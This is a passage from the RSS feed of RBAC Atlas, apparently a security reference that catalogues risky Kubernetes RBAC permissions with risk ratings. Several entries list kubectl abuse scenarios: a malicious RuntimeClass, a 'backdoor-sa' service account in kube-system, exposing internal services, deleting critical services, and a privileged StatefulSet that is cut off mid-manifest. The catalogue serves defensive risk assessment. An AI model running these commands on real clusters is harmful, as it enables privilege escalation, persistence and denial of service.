&lt;p>Allows managing PriorityLevelConfiguration objects cluster-wide. These are part of API Priority and Fairness, defining concurrency limits and queueing for API requests. Misconfiguration can lead to denial of service against the API server by starving critical requests or by setting unfair limits, impacting cluster stability.&lt;/p></description></item><item><title>Manage RoleBindings in a namespace (create, update, patch, delete)</title><link>https://rbac-atlas.github.io/rules/1030/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1030/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1030&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage RoleBindings in a namespace (create, update, patch, delete)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>rbac.authorization.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>rolebindings&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-bindingtoprivilegedrole">&lt;a href="https://rbac-atlas.github.io/tags/bindingtoprivilegedrole/">BindingToPrivilegedRole&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-rbacmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/rbacmanipulation/">RBACManipulation&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating, modifying, or deleting RoleBindings within a specific namespace. This enables an attacker to bind users, groups, or service accounts to Roles within that namespace. If a powerful ClusterRole is bound to a service account in the namespace, this can lead to privilege escalation.&lt;/p></description></item><item><title>Manage Roles in a namespace (create, update, patch, delete)</title><link>https://rbac-atlas.github.io/rules/1029/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1029/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1029&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage Roles in a namespace (create, update, patch, delete)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>rbac.authorization.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>roles&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-rbacmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/rbacmanipulation/">RBACManipulation&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants permission to create, modify, or delete Roles within a specific namespace. This allows an attacker to define or alter namespaced permissions, potentially granting themselves elevated access to resources within that namespace.&lt;/p></description></item><item><title>Manage RuntimeClasses</title><link>https://rbac-atlas.github.io/rules/1059/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1059/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1059&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage RuntimeClasses&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>node.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>runtimeclasses&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-nodeaccess">&lt;a href="https://rbac-atlas.github.io/tags/nodeaccess/">NodeAccess&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants control over RuntimeClasses, which define different container runtime configurations. A malicious RuntimeClass could specify a compromised runtime or allow for escape to the underlying node, leading to node access, tampering, and privilege escalation.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Create a new RuntimeClass pointing to a malicious or non-existent handler.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: node.k8s.io/v1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: RuntimeClass
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: malicious-runtime
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">handler: malicious-handler
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -f - &amp;lt;&amp;lt;EOF ... EOF&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Delete an existing RuntimeClass, potentially disrupting workloads using it.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete runtimeclass &amp;lt;runtimeclass-name&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete runtimeclass kata&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage ServiceAccounts cluster-wide</title><link>https://rbac-atlas.github.io/rules/1067/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1067/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1067&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage ServiceAccounts cluster-wide&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>serviceaccounts&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-identitymanagement">&lt;a href="https://rbac-atlas.github.io/tags/identitymanagement/">IdentityManagement&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating, updating, or deleting ServiceAccounts in any namespace. This can be used to create SAs, then bind them to privileged roles (if other RBAC permissions allow), or modify existing SAs, potentially interfering with workload identities.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Create a new ServiceAccount in any namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create serviceaccount &amp;lt;new-sa-name&amp;gt; -n &amp;lt;namespace&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create serviceaccount backdoor-sa -n kube-system&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Delete an existing ServiceAccount, potentially disrupting workloads.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete serviceaccount &amp;lt;serviceaccount-name&amp;gt; -n &amp;lt;namespace&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete serviceaccount default -n default&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage ServiceAccounts in a namespace</title><link>https://rbac-atlas.github.io/rules/1068/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1068/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1068&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage ServiceAccounts in a namespace&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-medium">Medium&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>serviceaccounts&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-identitymanagement">&lt;a href="https://rbac-atlas.github.io/tags/identitymanagement/">IdentityManagement&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating, updating, or deleting ServiceAccounts within a specific namespace. This can be used to create SAs within the namespace, which could then be bound to roles for privilege escalation within or from that namespace.&lt;/p></description></item><item><title>Manage Services cluster-wide</title><link>https://rbac-atlas.github.io/rules/1075/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1075/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1075&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage Services cluster-wide&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>NetworkManipulation&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>services&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-networkmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/networkmanipulation/">NetworkManipulation&lt;/a>&lt;/span>
 &lt;span class="tag-serviceexposure">&lt;a href="https://rbac-atlas.github.io/tags/serviceexposure/">ServiceExposure&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating, updating, or deleting Services in any namespace. This can be abused to expose internal applications, modify service types (e.g., ClusterIP to LoadBalancer), redirect traffic (by changing selectors), or cause denial of service.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Create a new LoadBalancer Service to expose an internal application externally.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -n &amp;lt;namespace&amp;gt; -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: v1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: Service
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: exposed-internal-app
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">spec:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> selector:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> app: &amp;lt;internal-app-label&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> ports:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - protocol: TCP
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> port: 80
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> targetPort: 8080
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> type: LoadBalancer
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -n production -f - &amp;lt;&amp;lt;EOF ... EOF (expose a database)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Delete a critical Service, causing application unavailability (DoS).&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete service &amp;lt;service-name&amp;gt; -n &amp;lt;namespace&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete service kubernetes -n default&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage Services in a namespace</title><link>https://rbac-atlas.github.io/rules/1076/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1076/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1076&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage Services in a namespace&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>NetworkManipulation&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>services&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-networkmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/networkmanipulation/">NetworkManipulation&lt;/a>&lt;/span>
 &lt;span class="tag-serviceexposure">&lt;a href="https://rbac-atlas.github.io/tags/serviceexposure/">ServiceExposure&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Permits creating, updating, or deleting Services within a specific namespace. This can lead to unintended exposure of applications, traffic misdirection, or denial of service within that namespace.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Create a new NodePort Service to expose an internal application in the namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -n &amp;lt;namespace&amp;gt; -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: v1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: Service
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: exposed-app-nodeport
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">spec:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> selector:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> app: &amp;lt;internal-app-label&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> ports:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - protocol: TCP
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> port: 80
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> targetPort: 8080
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> type: NodePort
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -n default -f - &amp;lt;&amp;lt;EOF ... EOF&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Delete a critical Service within the namespace, causing unavailability.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete service &amp;lt;service-name&amp;gt; -n &amp;lt;namespace&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete service my-web-app -n production&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage StatefulSets cluster-wide</title><link>https://rbac-atlas.github.io/rules/1037/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1037/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1037&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage StatefulSets cluster-wide&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>apps&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>statefulsets&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-persistence">&lt;a href="https://rbac-atlas.github.io/tags/persistence/">Persistence&lt;/a>&lt;/span>
 &lt;span class="tag-privilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/privilegeescalation/">PrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-workloadlifecycle">&lt;a href="https://rbac-atlas.github.io/tags/workloadlifecycle/">WorkloadLifecycle&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants permission to create, update, or delete StatefulSets across all namespaces. Similar to Deployments, this can be used to deploy pods (often stateful applications) with privileged configurations, leading to privilege escalation, persistence, and tampering.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Create a new StatefulSet with a privileged pod template.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -n &amp;lt;namespace&amp;gt; -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: apps/v1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: StatefulSet
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: privileged-statefulset
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">spec:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> serviceName: &amp;#34;privileged-service&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> replicas: 1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> selector:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> matchLabels:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> app: privileged-sts
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> template:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> metadata:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> labels:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> app: privileged-sts
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> spec:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> containers:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - name: attacker
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> image: busybox
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> command: [&amp;#34;/bin/sh&amp;#34;, &amp;#34;-c&amp;#34;, &amp;#34;sleep infinity&amp;#34;]
